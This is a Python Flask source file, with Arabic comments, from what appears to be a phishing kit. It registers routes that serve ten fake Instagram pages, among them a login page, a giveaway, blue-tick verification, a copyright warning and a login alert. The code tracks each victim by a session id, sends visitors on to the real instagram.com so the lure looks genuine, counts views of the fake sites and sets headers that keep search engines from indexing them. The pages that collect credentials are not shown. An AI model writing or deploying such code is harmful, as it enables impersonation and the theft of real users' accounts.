# fake_sites/instagram/routes.py
# ============================================================
# مسارات Instagram المزيفة — 10 قوالب
# ============================================================

import os

from flask import render_template_string, request, redirect

from config import PUBLIC_URL

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("fake_sites.instagram.routes")


TEMPLATES_DIR = os.path.join(os.path.dirname(__file__), 'templates')


# ============================================================
# قائمة قوالب Instagram (10)
# ============================================================
INSTAGRAM_TEMPLATES = {
    "01_login": {
        "name": "تسجيل دخول Instagram",
        "emoji": "🔐",
        "file": "01_login.html",
    },
    "02_giveaway": {
        "name": "مسابقة Giveaway",
        "emoji": "🎁",
        "file": "02_giveaway.html",
    },
    "03_verify": {
        "name": "التوثيق الأزرق",
        "emoji": "✅",
        "file": "03_verify.html",
    },
    "04_creator_fund": {
        "name": "صندوق المبدعين",
        "emoji": "💰",
        "file": "04_creator_fund.html",
    },
    "05_copyright": {
        "name": "تحذير حقوق النشر",
        "emoji": "📸",
        "file": "05_copyright.html",
    },
    "06_reels_bonus": {
        "name": "مكافآت Reels",
        "emoji": "🎬",
        "file": "06_reels_bonus.html",
    },
    "07_pro_dashboard": {
        "name": "لوحة احترافية",
        "emoji": "📊",
        "file": "07_pro_dashboard.html",
    },
    "08_login_alert": {
        "name": "تنبيه تسجيل دخول",
        "emoji": "🔒",
        "file": "08_login_alert.html",
    },
    "09_dating": {
        "name": "Instagram Dating",
        "emoji": "❤️",
        "file": "09_dating.html",
    },
    "10_shopping": {
        "name": "Instagram Shopping",
        "emoji": "🛍️",
        "file": "10_shopping.html",
    },
}


def _load_template(filename, **kwargs):
    """يقرأ قالب ويستبدل المتغيرات"""
    path = os.path.join(TEMPLATES_DIR, filename)

    if not os.path.exists(path):
        logger.warning(f"Template not found: {path}")
        return None

    with open(path, 'r', encoding='utf-8') as f:
        content = f.read()

    return render_template_string(content, **kwargs)


def _inject_globals(html, session_id, template_key):
    """يضيف متغيرات FS العامة للصفحة"""
    if not html:
        return None

    globals_js = f"""
    <script>
        window.FS_SESSION_ID = "{session_id}";
        window.FS_SITE_NAME = "instagram_{template_key}";
        window.FS_REDIRECT_URL = "https://www.instagram.com";
    </script>
    """

    if '</head>' in html:
        html = html.replace('</head>', globals_js + '</head>', 1)
    else:
        html = globals_js + html

    return html


# ============================================================
# تسجيل المسارات
# ============================================================
def register_instagram_routes(app):
    """تسجيل مسارات Instagram المزيفة"""

    @app.route('/fs/instagram/<template_key>', methods=['GET'])
    def instagram_template(template_key):
        """يعرض قالب Instagram حسب المفتاح"""

        # ابحث عن القالب
        tpl = INSTAGRAM_TEMPLATES.get(template_key)
        if not tpl:
            logger.warning(f"Unknown IG template: {template_key}")
            return redirect("https://www.instagram.com", code=302)

        # جلب session_id من query
        session_id = request.args.get('s', '').strip()

        # لو مفيش session، اعمل redirect
        if not session_id:
            logger.warning(f"No session_id for IG template: {template_key}")
            return redirect("https://www.instagram.com", code=302)

        try:
            # حمّل القالب
            html = _load_template(
                tpl['file'],
                session_id=session_id,
                public_url=PUBLIC_URL,
            )

            if not html:
                logger.warning(f"Template file empty: {tpl['file']}")
                return redirect("https://www.instagram.com", code=302)

            # أضف متغيرات FS
            html = _inject_globals(html, session_id, template_key)

            # إحصائيات
            metrics.inc_counter("fake_site_views", tags={
                "site": "instagram",
                "template": template_key
            })

            logger.info(f"📄 IG template served: {template_key} | session={session_id[:12]}")

            response = app.make_response(html)
            response.headers['Content-Type'] = 'text/html; charset=utf-8'
            response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
            response.headers['X-Robots-Tag'] = 'noindex, nofollow'

            return response

        except Exception as e:
            logger.exception(f"instagram_template error: {e}")
            return redirect("https://www.instagram.com", code=302)


    logger.info("[+] Instagram routes registered: /fs/instagram/<template_key>")
